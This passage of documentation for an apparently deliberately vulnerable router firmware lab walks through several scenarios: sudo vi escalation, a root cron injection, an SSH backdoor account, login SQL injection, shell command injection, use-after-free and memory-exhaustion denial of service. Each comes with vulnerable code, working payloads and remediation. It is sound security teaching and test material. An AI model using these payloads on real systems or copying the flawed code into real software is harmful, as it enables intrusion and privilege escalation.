[GTFOBins' entry for `vi`](https://gtfobins.github.io/gtfobins/vi/) for the
general pattern this scenario models.

The credential is set the same way as in the previous scenario, directly in
[`iotbench-router-cwe798-vi-privilege-escalation.bb`](../meta-iotbench/recipes-images/iotbench-router-cwe798-vi-privilege-escalation.bb),
with the identical `$6$iotbench$...` hash. This is again
[CWE-798: Use of Hard-coded Credentials](https://cwe.mitre.org/data/definitions/798.html)
for the entry point, chained into privilege escalation through an
over-broad sudo grant once the attacker is authenticated as `routerweb`.

### Build and boot

Build and boot as shown in [Build and boot any device](#build-and-boot-any-device)
with `TEST_FIRMWARE=router-cwe798-vi-privilege-escalation`. The `-t` flag on
`ssh` above is required to allocate a pseudo-terminal for the interactive
editor session.

### Payload and expected result

| Request condition | Expected result |
| --- | --- |
| SSH as `routerweb` with password `iotbench` | Login succeeds |
| `sudo /bin/busybox vi /tmp/iotbench-vi.txt` with password `iotbench` | Editor opens as root |
| `:!id` inside the editor | Prints `uid=0(root) gid=0(root) ...` |
| `:!whoami` or `:!/bin/sh` inside the editor | Also succeeds; any shell command runs as root |

| Result | Interpretation |
| --- | --- |
| SSH or `sudo` prompt rejects the password | Wrong credential or wrong firmware image |
| `:!id` prints `uid=0(root)` | Confirmed: the hardcoded credential plus the unrestricted `vi` sudo rule reach a root shell |

### Completed validation

Boot-tested manually on 30 October 2026 (image rebuilt from source in this
session, `0 ERROR` in the BitBake log). Exported rootfs SHA-256:
`10fcc58f7e70acedfb8c7c54cb1afc1c95a121951a5875b04403a56065fb6d75`. Full
details in
[validation/francesco-manual-boot-validation-2026-10-30.md](validation/francesco-manual-boot-validation-2026-10-30.md).

### Remediation and verification

Replace the shared password as in the previous scenario. Separately, never
grant `sudo` on an interactive editor, pager or shell-capable tool for a
general maintenance task; if a specific file genuinely needs privileged
editing, use a narrow wrapper that only opens that one file non-interactively
(for example `sudoedit`, which is designed for exactly this and does not run
the editor as root). After a fix, repeat the `sudo busybox vi` command above
and confirm the account can no longer reach a root shell through it.

## Writable Root Cron Target

### Build, boot and manual testing

**What this tests.** A cron job that runs as root once a minute reads a
file the web dashboard's unprivileged service account can write, and
interpolates its contents, unquoted, into a shell command.

**Build and boot — host:**

```bash
FIRMWARE=router-cwe078-writable-root-cron docker compose up --build --force-recreate yocto
FIRMWARE=router-cwe078-writable-root-cron ./scripts/run-qemu-docker.sh
```

Boot **without** `QEMU_DETACH=1`: the test needs the serial console both to
write the payload and to wait for the cron job.

**Test — guest, after logging in as `root` / `routeradmin`:**

```sh
su -s /bin/sh routerweb -c \
  "printf 'router; id > /tmp/iotbench-cron-root\n' > /var/lib/router-dashboard/maintenance-target"
sleep 65
cat /tmp/iotbench-cron-root
```

Expected: the marker file contains root's `id` output
(`uid=0(root) gid=0(root) ...`).

### Scenario and ground truth

The module recipe is
[`cwe078-writable-root-cron_1.0.bb`](../meta-iotbench/recipes-vulns/cwe078-writable-root-cron/cwe078-writable-root-cron_1.0.bb).
It installs a cron entry,
[`iotbench-root-maintenance.cron`](../meta-iotbench/recipes-vulns/cwe078-writable-root-cron/files/iotbench-root-maintenance.cron):

```text
* * * * * root /var/lib/router-dashboard/cron-maintenance.sh
```

and the job it runs,
[`cron-maintenance.sh`](../meta-iotbench/recipes-vulns/cwe078-writable-root-cron/files/cron-maintenance.sh):

```sh
TARGET="$(cat /var/lib/router-dashboard/maintenance-target 2>/dev/null)"
/bin/sh -c "printf 'maintenance target: %s\\n' ${TARGET}" \
    > /var/lib/router-dashboard/cron-last-run.txt 2>&1
```

`maintenance-target` is installed `chown 995:995` (`routerweb`), the same web
service account used throughout this document's router scenarios, so any
process able to write that file — including the dashboard itself if it were
compromised through one of the other scenarios — controls `TARGET`. The job
then substitutes `$TARGET` into a second `/bin/sh -c` invocation **without
quoting it**, so semicolons and other shell metacharacters in the file are
interpreted as new commands by the root-owned job, not as plain text passed
to `printf`.

This is [CWE-78: OS Command Injection](https://cwe.mitre.org/data/definitions/78.html),
with the root cron job's privilege as the impact: the sink executes with the
root UID regardless of who last wrote the input file, which is why this
scenario, unlike the dashboard-reachable injections later in this document,
is tested from the guest console rather than over HTTP — reaching this sink
at all is itself part of the demonstrated chain (an attacker would normally
reach `maintenance-target` through a compromised `routerweb` process, not by
logging in as root to write it directly).

### Build and boot

Build and boot as shown in [Build and boot any device](#build-and-boot-any-device)
with `TEST_FIRMWARE=router-cwe078-writable-root-cron`, omitting
`QEMU_DETACH=1`. The cron entry fires once a minute, so allow up to ~65
seconds after writing the payload before checking the marker file.

### Payload and expected result

| Action | Expected result |
| --- | --- |
| `su -s /bin/sh routerweb -c "printf '...' > .../maintenance-target"` | Succeeds; file owned by `routerweb` |
| Wait up to ~65 s for the next cron tick | `cron-maintenance.sh` runs as root |
| `cat /tmp/iotbench-cron-root` | Contains root's `id` output |
| `cat /var/lib/router-dashboard/cron-last-run.txt` | Shows the job's own `maintenance target: ...` line, including the injected text |

| Result | Interpretation |
| --- | --- |
| Marker file absent after 65 s | Wait a little longer: the job runs on the wall-clock minute boundary, so the first run after the write can take up to ~119 s |
| Marker file contains `uid=0(root)` | Confirmed: unsanitized input written by the web account reached a command executed by root |

### Completed validation

Boot-tested manually on 30 October 2026 (image rebuilt from source in this
session, `0 ERROR` in the BitBake log). Exported rootfs SHA-256:
`a1dc81b06f8699a252137959ac3c0cfb11edd9bd1dddcfdf9a1a0927a3013e47`. Full
details in
[validation/francesco-manual-boot-validation-2026-10-30.md](validation/francesco-manual-boot-validation-2026-10-30.md).

### Remediation and verification

Never interpolate externally influenced data into a shell command string.
Pass `TARGET` as a quoted argument or environment variable to a fixed
command instead of building a new shell command from it (for example
`printf 'maintenance target: %s\n' "$TARGET"`, with `$TARGET` quoted, removes
the injection even though the value is still attacker-controlled). Separately,
a root-run job should not trust a file writable by an unprivileged service
account at all; if the dashboard needs to request maintenance actions, it
should write to a validated, schema-checked request file that a privileged
helper interprets, not a raw string substituted into a shell command. After a
fix, repeat the write-and-wait test above and confirm the marker file is not
created, or confirm `cron-last-run.txt` shows the literal target text instead
of executing it.

## SSH Hardcoded Backdoor

### Build, boot and manual testing

**What this tests.** An undocumented `support` system account with a fixed
password is created on every image and is reachable over SSH, independent of
any legitimate admin workflow.

**Build and boot — host:**

```bash
FIRMWARE=router-cwe287-ssh-hardcoded-backdoor docker compose up --build --force-recreate yocto
QEMU_DETACH=1 FIRMWARE=router-cwe287-ssh-hardcoded-backdoor ./scripts/run-qemu-docker.sh
```

**Test — second host terminal:**

```bash
ssh -p 2222 support@127.0.0.1 id
```

Enter `iotbench` when prompted. Expected: `uid=996(support) ...`.

### Scenario and ground truth

The module recipe is
[`cwe287-ssh-hardcoded-backdoor_1.0.bb`](../meta-iotbench/recipes-vulns/cwe287-ssh-hardcoded-backdoor/cwe287-ssh-hardcoded-backdoor_1.0.bb).
It creates the account directly in its `USERADD_PARAM`:

```text
USERADD_PARAM:${PN} = "--system --uid 996 --home-dir /home/support --create-home --shell /bin/sh --password '$6$iotbench$EhBo2e24buhGDuzZQTBFBg58AJA3.wI.gOIVDU0A91zC8jaiqiIY//.WW6PfQB6Jf4qnaLLCU7BFkXvuKT1XG1' support"
```

The plaintext is `iotbench`, recoverable from this repository or from any
published copy of the firmware; the same literal hash is also reused, byte
for byte, by `routerweb`'s password in
[Hardcoded Credentials: LD_PRELOAD Sudo Rule](#hardcoded-credentials-ld_preload-sudo-rule)
and
[Hardcoded Credentials: Vi Privilege Escalation](#hardcoded-credentials-vi-privilege-escalation).
The account has a real login shell (`/bin/sh`), a home directory and no
expiry, so it behaves exactly like a normal interactive user once reached,
with no further setup required beyond knowing the password.

This is [CWE-287: Improper Authentication](https://cwe.mitre.org/data/definitions/287.html),
specifically the "backdoor account" pattern: an authentication mechanism
(SSH password login) functions correctly, but the set of credentials it
accepts includes one that was never disclosed to the device owner and cannot
be rotated or disabled through any documented interface.

### Build and boot

Build and boot as shown in [Build and boot any device](#build-and-boot-any-device)
with `TEST_FIRMWARE=router-cwe287-ssh-hardcoded-backdoor`.

### Payload and expected result

| Request condition | Expected result |
| --- | --- |
| SSH as `support` with password `iotbench` | Login succeeds, real shell |
| `id` | `uid=996(support) gid=996(support) groups=996(support)` |
| SSH as `support` with any other password | Rejected |

| Result | Interpretation |
| --- | --- |
| `Permission denied` with the published password | Confirm you booted `router-cwe287-ssh-hardcoded-backdoor` and that SSH forwarding reached the guest |
| Login succeeds, `id` shows `uid=996(support)` | Confirmed: the undocumented backdoor account authenticates |

### Completed validation

Boot-tested manually on 30 October 2026 (image rebuilt from source in this
session, `0 ERROR` in the BitBake log). Exported rootfs SHA-256:
`63a37ba1344606820188c03ef5ee03d644687e8dd75d582409d6e55261c06b42`. Full
details in
[validation/francesco-manual-boot-validation-2026-10-30.md](validation/francesco-manual-boot-validation-2026-10-30.md).

### Remediation and verification

Remove the account and its credential from the firmware source entirely;
there is no safe way to "hide" a backdoor account, only to delete it.
Vendor remote-support access, if genuinely needed, should use per-device or
per-session credentials issued and revocable through a documented channel,
not a password shared across every unit. After a fix, repeat the SSH login
above with `iotbench` and confirm the account either does not exist or
rejects that password.

## HTTP Login SQL Injection

### Build, boot and manual testing

**What this tests.** The dashboard's login panel builds a SQL query by
string-concatenating the submitted username and password directly into a
`SELECT`, so a crafted password can change the query's logic instead of
being compared as data.

**Build and boot — host:**

```bash
FIRMWARE=router-cwe089-http-sqli-auth docker compose up --build --force-recreate yocto
QEMU_DETACH=1 FIRMWARE=router-cwe089-http-sqli-auth ./scripts/run-qemu-docker.sh
```

**Test — browser:** open <http://127.0.0.1:8080>, find **HTTP Login**, and
submit username `admin`, password `' OR '1'='1`. Expected output includes
`role=admin` even though that is not the real password.

### Scenario and ground truth

The module recipe is
[`cwe089-http-sqli-auth_1.0.bb`](../meta-iotbench/recipes-vulns/cwe089-http-sqli-auth/cwe089-http-sqli-auth_1.0.bb),
installing
[`module.php`](../meta-iotbench/recipes-vulns/cwe089-http-sqli-auth/files/module.php).
On first use it creates a SQLite database at `/var/lib/router-dashboard/auth.db`
seeded with two rows:

```text
INSERT INTO users VALUES('admin','correct-horse','admin');
INSERT INTO users VALUES('viewer','viewer','viewer');
```

The login action then builds its query as:

```php
$sql = "SELECT role FROM users WHERE username = '" . $username . "' AND password = '" . $password . "';";
```

with `$username` and `$password` taken directly from the request body and
concatenated with no escaping or parameter binding, then handed to the
`sqlite3` CLI via `proc_open`. The published payload, password
`' OR '1'='1`, closes the password string early and appends an always-true
condition, so the effective query becomes
`... AND password = '' OR '1'='1';`, which matches the first row in the
table regardless of the real password and returns its `role`.

This is [CWE-89: SQL Injection](https://cwe.mitre.org/data/definitions/89.html):
untrusted input reaches a SQL interpreter through string concatenation
instead of a parameterized query or prepared statement. The impact here is
an authentication bypass, but the same unescaped concatenation would equally
allow reading or altering unrelated rows had the table held more than two
test accounts.

### Build and boot

Build and boot as shown in [Build and boot any device](#build-and-boot-any-device)
with `TEST_FIRMWARE=router-cwe089-http-sqli-auth`.

### Payload and expected result

| Username | Password | Expected result |
| --- | --- | --- |
| `admin` | `correct-horse` (real password) | `role=admin` |
| `admin` | `' OR '1'='1` | `role=admin`, same result, without knowing the real password |
| `nobody` | `' OR '1'='1` | Still matches the first row (`admin`) regardless of the username supplied, because the injected clause is unconditionally true |
| `admin` | `wrong-password` | Query returns no row; login panel shows no role |

| Result | Interpretation |
| --- | --- |
| Output shows `role=admin` for a wrong but crafted password | Confirmed: the login query is injectable and the real credential is not required |
| Output shows no role for the crafted payload | Confirm you booted `router-cwe089-http-sqli-auth`: this is the only router image with the vulnerable login module installed |

### Completed validation

Boot-tested manually on 30 October 2026 (image rebuilt from source in this
session, `0 ERROR` in the BitBake log). Exported rootfs SHA-256:
`5af020aba79bacf717c99c2c8382ec9fc3a3eac5653111cca52f5f1bbf691c20`. Full
details in
[validation/francesco-manual-boot-validation-2026-10-30.md](validation/francesco-manual-boot-validation-2026-10-30.md).

### Remediation and verification

Use parameterized queries or prepared statements for every value that comes
from the request, never string concatenation into SQL text; with PHP's
SQLite3 bindings this means `SQLite3Stmt::bindValue()` with `?` placeholders
instead of building the `SELECT` string by hand. Store password hashes, not
plaintext, and compare with a constant-time check after a successful lookup,
rather than folding the password into the `WHERE` clause at all. After a
fix, repeat the `' OR '1'='1` payload above and confirm the login is
rejected exactly as it would be for any other wrong password.

## Vulnerable Bash Files: Command Injection

### Build, boot and manual testing

**What this tests.** A Bash diagnostics helper takes a user-supplied
"target" string and `eval`s a command built by directly substituting it into
a `printf` command line, so shell metacharacters in the target are
interpreted rather than passed through as data.

**Build and boot — host:**

```bash
FIRMWARE=router-cwe078-bash-command-injection docker compose up --build --force-recreate yocto
QEMU_DETACH=1 FIRMWARE=router-cwe078-bash-command-injection ./scripts/run-qemu-docker.sh
```

**Test — browser:** open <http://127.0.0.1:8080>, find **Shell
Diagnostics**, and set the target field to `127.0.0.1; id`. Expected output
includes `uid=995(routerweb)` after the diagnostic text.

### Scenario and ground truth

The module recipe is
[`cwe078-bash-command-injection_1.0.bb`](../meta-iotbench/recipes-vulns/cwe078-bash-command-injection/cwe078-bash-command-injection_1.0.bb),
installing the dashboard module
[`module.php`](../meta-iotbench/recipes-vulns/cwe078-bash-command-injection/files/module.php)
and the helper script
[`iotbench-netdiag.sh`](../meta-iotbench/recipes-vulns/cwe078-bash-command-injection/files/iotbench-netdiag.sh):

```sh
TARGET="$1"
COMMAND="printf 'checking %s\n' $TARGET"
eval "$COMMAND"
```

`$TARGET` is already quoted when it is assigned from `$1`, but it is then
substituted **unquoted** into the `COMMAND` string, and that string is passed
to `eval`. A target of `127.0.0.1; id` makes `COMMAND` literally
`printf 'checking %s\n' 127.0.0.1; id`, and `eval` runs that as two shell
commands: the intended `printf` and then `id`, with `id`'s output captured
by the PHP module alongside the diagnostic text. The dashboard module itself
only forwards the submitted `target` field unchanged to this script as
`argv[1]`, via `proc_open(['/usr/bin/iotbench-netdiag', $target], ...)`, so
no PHP-level sanitization stands between the request and the shell.

This is [CWE-78: OS Command Injection](https://cwe.mitre.org/data/definitions/78.html).
The process runs as `routerweb`, the dashboard's own service account, not
root, which is why the expected evidence is `uid=995(routerweb)` rather than
`uid=0`; this scenario demonstrates arbitrary command execution as the web
service account, which other scenarios in this document (for example
[Writable Root Cron Target](#writable-root-cron-target)) show how to escalate
further.

### Build and boot

Build and boot as shown in [Build and boot any device](#build-and-boot-any-device)
with `TEST_FIRMWARE=router-cwe078-bash-command-injection`.

### Payload and expected result

| Target field value | Expected result |
| --- | --- |
| `127.0.0.1` (benign) | `checking 127.0.0.1` only |
| `127.0.0.1; id` | `checking 127.0.0.1` followed by `uid=995(routerweb) gid=995(routerweb) ...` |
| `` `id` `` (command substitution) | Also executes, since `eval` re-parses the whole string |

| Result | Interpretation |
| --- | --- |
| Output shows only `checking 127.0.0.1; id` as literal text, no `uid=` line | Confirm you booted `router-cwe078-bash-command-injection`, not a corrected build |
| Output includes `uid=995(routerweb)` | Confirmed: the target field reaches an `eval`'d shell command |

### Completed validation

Boot-tested manually on 30 October 2026 (image rebuilt from source in this
session, `0 ERROR` in the BitBake log). Exported rootfs SHA-256:
`b10a75c3599946c4e43e3dd168143e2f1c421f733ea5bc496f590a886961f75f`. Full
details in
[validation/francesco-manual-boot-validation-2026-10-30.md](validation/francesco-manual-boot-validation-2026-10-30.md).

### Remediation and verification

Drop `eval` entirely: pass the target as a proper positional argument to
`printf` (`printf 'checking %s\n' "$TARGET"`, quoted, with no re-parsing)
instead of building a command string from it. More generally, validate the
target against the format actually expected (for example a hostname or IPv4
address pattern) before using it at all, and prefer calling the ping/probe
utility directly with an argument array rather than composing shell text.
After a fix, repeat the `127.0.0.1; id` payload and confirm the output
contains only the literal diagnostic text, with no `uid=` line.

## Vulnerable C Binaries: Command Injection

### Build, boot and manual testing

**What this tests.** A native C diagnostics helper builds a shell command
line with `snprintf` and hands it to `system()`, so an attacker-controlled
target string reaches the shell the same way as the Bash scenario above,
just from compiled code instead of a shell script.

**Build and boot — host:**

```bash
FIRMWARE=router-cwe077-c-command-injection docker compose up --build --force-recreate yocto
QEMU_DETACH=1 FIRMWARE=router-cwe077-c-command-injection ./scripts/run-qemu-docker.sh
```

**Test — browser:** open <http://127.0.0.1:8080>, find **C Service Probe**,
and set the target field to `router; id`. Expected output includes
`uid=995(routerweb)`.

### Scenario and ground truth

The module recipe is
[`cwe077-c-command-injection_1.0.bb`](../meta-iotbench/recipes-vulns/cwe077-c-command-injection/cwe077-c-command-injection_1.0.bb),
compiling
[`iotbench-cdiag.c`](../meta-iotbench/recipes-vulns/cwe077-c-command-injection/files/iotbench-cdiag.c):

```c
char command[512];
snprintf(command, sizeof(command), "printf 'probing %%s\\n' %s", argv[1]);
return system(command);
```

`argv[1]` (the dashboard's `target` field, forwarded unchanged exactly as in
[Vulnerable Bash Files: Command Injection](#vulnerable-bash-files-command-injection))
is formatted into `command` with `%s`, unquoted, and that buffer is then
executed with `system()`, which runs it through `/bin/sh -c`. `snprintf`
bounds the write to `command`'s 512-byte buffer and the function bails out if
the formatted string would be truncated, but neither check inspects the
*content* of `argv[1]` for shell metacharacters; a target of `router; id`
produces the command line `printf 'probing %s\n' router; id`, which `/bin/sh
-c` runs as two commands exactly as in the Bash case.

This is the parent weakness of the previous scenario's specialization:
[CWE-77: Command Injection](https://cwe.mitre.org/data/definitions/77.html)
is the general class (untrusted input reaches a command interpreter);
[CWE-78: OS Command Injection](https://cwe.mitre.org/data/definitions/78.html),
used for the Bash and cron scenarios elsewhere in this document, is its
OS-command-specific child. The catalog maps this scenario to CWE-77
specifically because the vulnerable call is `system()` building a shell
command line from C, the canonical case the parent category describes; the
observable impact and privilege level are otherwise identical to the Bash
variant.

### Build and boot

Build and boot as shown in [Build and boot any device](#build-and-boot-any-device)
with `TEST_FIRMWARE=router-cwe077-c-command-injection`.

### Payload and expected result

| Target field value | Expected result |
| --- | --- |
| `router` (benign) | `probing router` only |
| `router; id` | `probing router` followed by `uid=995(routerweb) gid=995(routerweb) ...` |
| A target long enough to approach the 512-byte `command` buffer | Rejected with `target too long` before `system()` runs |

| Result | Interpretation |
| --- | --- |
| Output shows only the literal `probing router; id` text | Confirm you booted `router-cwe077-c-command-injection` |
| Output includes `uid=995(routerweb)` | Confirmed: the compiled helper's `system()` call executes injected shell commands |

### Completed validation

Boot-tested manually on 30 October 2026 (image rebuilt from source in this
session, `0 ERROR` in the BitBake log). Exported rootfs SHA-256:
`176707ab7ee4d14646cddb06367d306710c98c65357a00139086848a8536c457`. Full
details in
[validation/francesco-manual-boot-validation-2026-10-30.md](validation/francesco-manual-boot-validation-2026-10-30.md).

### Remediation and verification

Avoid `system()` (and `popen()`) for anything built from untrusted input;
use `execve()`/`posix_spawn()` with an explicit argument vector instead,
which never invokes a shell and so has no metacharacter-interpretation step
at all. If a shell is genuinely required, validate the input strictly
against an allow-list pattern before composing the command line. After a
fix, repeat the `router; id` payload above and confirm the output contains
only the literal probing text, with no `uid=` line.

## Use After Free: Session Cache

### Build, boot and manual testing

**What this tests.** A native helper frees a heap object that still holds a
live pointer (`stale`), allocates a second, unrelated object that often lands
in the same freed memory, and then dereferences the stale pointer as if it
still held the original data.

**Build and boot — host:**

```bash
FIRMWARE=router-cwe416-use-after-free docker compose up --build --force-recreate yocto
QEMU_DETACH=1 FIRMWARE=router-cwe416-use-after-free ./scripts/run-qemu-docker.sh
```

**Test — browser:** open <http://127.0.0.1:8080>, find **Session Cache**,
and submit the replacement object `role=admin;device=router`. Expected
output includes `ACCESS GRANTED via freed object reuse`.

### Scenario and ground truth

The module recipe is
[`cwe416-use-after-free_1.0.bb`](../meta-iotbench/recipes-vulns/cwe416-use-after-free/cwe416-use-after-free_1.0.bb),
compiling
[`iotbench-uaf.c`](../meta-iotbench/recipes-vulns/cwe416-use-after-free/files/iotbench-uaf.c):

```c
char *session = malloc(64);
strcpy(session, "role=user;device=router");
char *stale = session;
free(session);

char *replacement = malloc(64);
snprintf(replacement, 64, "%s", argc > 1 ? argv[1] : "role=user");

printf("stale authorization object: %s\n", stale);
if (strstr(stale, "role=admin") != NULL) {
    puts("ACCESS GRANTED via freed object reuse");
}
```

`session` starts as `role=user;device=router` and is freed. The next
`malloc(64)` for `replacement` is a request for the exact same size as the
chunk just freed, which on glibc's allocator very often returns that same
address (the freed chunk goes to a per-size free list and is the first
candidate for a same-size request), so writing the attacker-controlled
`replacement` string frequently overwrites the bytes `stale` still points
to. The program then reads through `stale` — a pointer to memory the
allocator no longer considers owned by that variable — and, because its
content is now attacker-controlled, a payload containing `role=admin` flips
the subsequent authorization check.

This is [CWE-416: Use After Free](https://cwe.mitre.org/data/definitions/416.html).
Unlike a logic bug, this depends on allocator behavior (same-size reuse) that
is common but not architecturally guaranteed, which is why the recipe
performs the two allocations back-to-back with matching sizes and no
intervening allocations, to make the reuse reliable for a lab fixture rather
than demonstrating exploitation reliability in general.

### Build and boot

Build and boot as shown in [Build and boot any device](#build-and-boot-any-device)
with `TEST_FIRMWARE=router-cwe416-use-after-free`.

### Payload and expected result

| Replacement object field value | Expected result |
| --- | --- |
| `role=user` (benign) | `stale authorization object: role=user`, `access denied` |
| `role=admin;device=router` | `stale authorization object: role=admin;device=router`, `ACCESS GRANTED via freed object reuse` |

| Result | Interpretation |
| --- | --- |
| Output shows `access denied` for the `role=admin` payload | Unusual on this target/allocator; confirm you booted `router-cwe416-use-after-free` and retry once, since reuse is allocator behavior, not a hard guarantee |
| Output shows `ACCESS GRANTED via freed object reuse` | Confirmed: the replacement write reached memory still referenced through the freed pointer |

### Completed validation

Boot-tested manually on 30 October 2026 (image rebuilt from source in this
session, `0 ERROR` in the BitBake log). Exported rootfs SHA-256:
`b74ac59a05a820365f5a2b1fd306d4b3e4d228332b2f91dafe1817c9291d636a`. Full
details in
[validation/francesco-manual-boot-validation-2026-10-30.md](validation/francesco-manual-boot-validation-2026-10-30.md).

### Remediation and verification

Set pointers to `NULL` immediately after `free()` (`session = NULL;`) so any
later use crashes predictably on a null dereference instead of silently
reading reused memory, and never retain a second alias (`stale`) to a buffer
that is about to be freed. More structurally, this pattern usually signals
that the object's lifetime should be owned by a single, clearly scoped
variable rather than duplicated into an alias before release. After a fix,
repeat the `role=admin;device=router` payload and confirm the output no
longer shows `ACCESS GRANTED`.

## Uncontrolled Resource Consumption: Diagnostic DoS

### Build, boot and manual testing

**What this tests.** An unauthenticated diagnostics endpoint lets any caller
choose how many megabytes a helper process allocates and writes to, with no
upper bound tied to the guest's actual available memory.

**Build and boot — host:**

```bash
FIRMWARE=router-cwe400-diagnostic-dos docker compose up --build --force-recreate yocto
QEMU_DETACH=1 FIRMWARE=router-cwe400-diagnostic-dos ./scripts/run-qemu-docker.sh
```

**Test — browser:** open <http://127.0.0.1:8080>, find **Resource
Diagnostic**, and submit megabytes `128` (the default guest has 256 MB of
RAM; raise this only in a disposable lab, never on a shared or
resource-constrained host). Expected output includes
`allocated and touched 128 MB`.

### Scenario and ground truth

The module recipe is
[`cwe400-diagnostic-dos_1.0.bb`](../meta-iotbench/recipes-vulns/cwe400-diagnostic-dos/cwe400-diagnostic-dos_1.0.bb),
compiling
[`iotbench-dos.c`](../meta-iotbench/recipes-vulns/cwe400-diagnostic-dos/files/iotbench-dos.c):

```c
long mb = argc > 1 ? strtol(argv[1], NULL, 10) : 1;
size_t bytes = (size_t)mb * 1024u * 1024u;
char *buf = malloc(bytes);
memset(buf, 0x41, bytes);
printf("allocated and touched %ld MB\n", mb);
sleep(2);
free(buf);
```

The PHP module strips the submitted `megabytes` field down to digits
(`preg_replace('/[^0-9]/', '', ...)`), so it cannot be used for a second
injection, but it places **no upper bound** on the resulting number before
passing it to the helper. The helper then allocates that many megabytes and
unconditionally `memset`s the entire buffer, which forces the kernel to back
every page rather than leaving them as lazily-committed, unused virtual
memory; on the 256 MB default guest, a request near or above that figure
measurably pressures the system (allocation failure, swapping if configured,
or the kernel OOM-killer reclaiming memory from the guest), with no
authentication, rate limit or per-caller budget involved at any point in the
path.

This is [CWE-400: Uncontrolled Resource Consumption](https://cwe.mitre.org/data/definitions/400.html).
The weakness is architectural, not a type of memory-corruption bug: the
resource request is perfectly well-formed, entirely attacker-controlled in
magnitude, and unauthenticated, which is exactly the combination this
category describes.

### Build and boot

Build and boot as shown in [Build and boot any device](#build-and-boot-any-device)
with `TEST_FIRMWARE=router-cwe400-diagnostic-dos`. The default guest in this
scenario's exported image has 256 MB of RAM (see `QEMU_MEMORY` in
[`run-qemu.sh`](../scripts/run-qemu.sh) to change it in a disposable lab
only).

### Payload and expected result

| Megabytes field value | Expected result on a 256 MB guest |
| --- | --- |
| `1` (benign) | `allocated and touched 1 MB` |
| `128` | `allocated and touched 128 MB`, visible memory pressure on the guest |
| A value at or beyond the guest's total RAM | `allocation failed for <n> MB`, or the guest's OOM killer reclaims memory elsewhere, or the helper itself is killed |

| Result | Interpretation |
| --- | --- |
| Request always succeeds instantly regardless of size, no guest impact at all | Confirm you booted `router-cwe400-diagnostic-dos`; also confirm the guest's configured memory matches what you expect |
| Large requests measurably stress or fail on the guest | Confirmed: an unauthenticated request controls an unbounded memory allocation |

### Completed validation

Boot-tested manually on 30 October 2026 (image rebuilt from source in this
session, `0 ERROR` in the BitBake log). Exported rootfs SHA-256:
`e7fdd5f781835c77fa8feb7c03418272c35206daaf37fc5972bae772620d3a89`. Full
details in
[validation/francesco-manual-boot-validation-2026-10-30.md](validation/francesco-manual-boot-validation-2026-10-30.md).

### Remediation and verification

Require authentication for any endpoint that drives resource consumption on
the attacker's behalf, and clamp the requested size to a small, fixed upper
bound regardless of who is asking (for example a few megabytes, enough for a
genuine diagnostic, not a fraction of total device RAM). Consider also
applying a `setrlimit(RLIMIT_AS, ...)` to the helper process itself as a
second layer, so a bug or a bypass of the application-level check still
cannot exhaust the host. After a fix, repeat the `128` payload above and
confirm the request is either rejected outright or capped well below a
level that stresses the guest.

## Command Injection via Service Interface

### Build, boot and manual testing

**What this tests.** A small TCP service, separate from the HTTP dashboard,
reads one line from any connecting client and passes it, unsanitized, to a
shell command whose output is streamed back to the same client.

**Build and boot — host:**

```bash
FIRMWARE=router-cwe078-service-interface-injection docker compose up --build --force-recreate yocto
QEMU_DETACH=1 FIRMWARE=router-cwe078-service-interface-injection ./scripts/run-qemu-docker.sh
```

**Test — second host terminal:**

```bash
printf 'status; id\n' | nc 127.0.0.1 9090
```

Expected output includes `uid=995(routerweb)`.

### Scenario and ground truth

The module recipe is
[`cwe078-service-interface-injection_1.0.bb`](../meta-iotbench/recipes-vulns/cwe078-service-interface-injection/cwe078-service-interface-injection_1.0.bb),
compiling
[`iotbench-service-iface.c`](../meta-iotbench/recipes-vulns/cwe078-service-interface-injection/files/iotbench-service-iface.c)
into a systemd-managed daemon
([`iotbench-service-iface.service`](../meta-iotbench/recipes-vulns/cwe078-service-interface-injection/files/iotbench-service-iface.service),
running as `routerweb`, listening on TCP `9090`). For each connection it
reads up to 191 bytes, strips the trailing newline, then:

```c
snprintf(command, sizeof(command), "printf 'service status for %%s\\n' %s", input);
FILE *fp = popen(command, "r");
```

`input` — the raw line the client sent, with no validation — is substituted
unquoted into `command`, and `popen()` runs the result through `/bin/sh -c`,
streaming its stdout back over the same socket. A line of `status; id`
produces the shell command `printf 'service status for %s\n' status; id`,
executed as two commands exactly like the dashboard-reachable injections
earlier in this document; the difference here is the entry point, a raw TCP
socket rather than the web dashboard, so this is the only router scenario in
this document that is tested with `nc`/a raw socket client instead of a
browser.

This is [CWE-78: OS Command Injection](https://cwe.mitre.org/data/definitions/78.html).
The dashboard also exposes an equivalent "probe" action that connects to this
same port on the caller's behalf, documented in
[device-payloads.md](device-payloads.md); the direct TCP payload above is the
more minimal way to exercise the same sink.

### Build and boot

Build and boot as shown in [Build and boot any device](#build-and-boot-any-device)
with `TEST_FIRMWARE=router-cwe078-service-interface-injection`. Use the
second host terminal for the TCP request while QEMU stays running in the
first.

### Payload and expected result

| Line sent to `:9090` | Expected response |
| --- | --- |
| `status` (benign) | `service status for status` |
| `status; id` | `service status for status` followed by `uid=995(routerweb) gid=995(routerweb) ...` |
| A line over ~191 bytes | Truncated by the fixed-size read buffer before reaching the shell |

| Result | Interpretation |
| --- | --- |
| Connection refused on `:9090` | Investigate port forwarding or confirm the service unit started; the defect has not yet been evaluated |
| Response shows only the literal `service status for status; id` text | Confirm you booted `router-cwe078-service-interface-injection` |
| Response includes `uid=995(routerweb)` | Confirmed: the raw TCP line reaches a shell command |

### Completed validation

Boot-tested manually on 30 October 2026 (image rebuilt from source in this
session, `0 ERROR` in the BitBake log). Exported rootfs SHA-256:
`2d71647458bf571ec77ba010bb8a272fdf68b5ec05fe87390ce4c0711330bcc7`. Full
details in
[validation/francesco-manual-boot-validation-2026-10-30.md](validation/francesco-manual-boot-validation-2026-10-30.md).

### Remediation and verification

As with the other command-injection scenarios in this document, stop
building shell command text from untrusted input: pass the parsed field as
an argument to `execve()`/`posix_spawn()` instead of through `popen()`, or at
minimum validate it against a strict allow-list before any shell is
involved. Also apply the same network-facing hardening any raw TCP service
needs regardless of this bug: authentication for the service interface and
a bound on accepted line length that matches the actual protocol, not just
the buffer size. After a fix, repeat the `status; id` payload above and
confirm the response contains only the literal status text.

## Path Traversal: 404 Dispatcher

### Build, boot and manual testing

**What this tests.** Lighttpd's 404 error handler is routed through a PHP
script that reads an arbitrary file below a fixed "reports" directory, built
from the originally requested URL after decoding it **twice** — which lets a
doubly URL-encoded `../` sequence escape that directory once the first
decode pass has already happened inside Lighttpd itself.

**Build and boot — host:**

```bash
FIRMWARE=router-cwe022-path-traversal docker compose up --build --force-recreate yocto
QEMU_DETACH=1 FIRMWARE=router-cwe022-path-traversal ./scripts/run-qemu-docker.sh
```

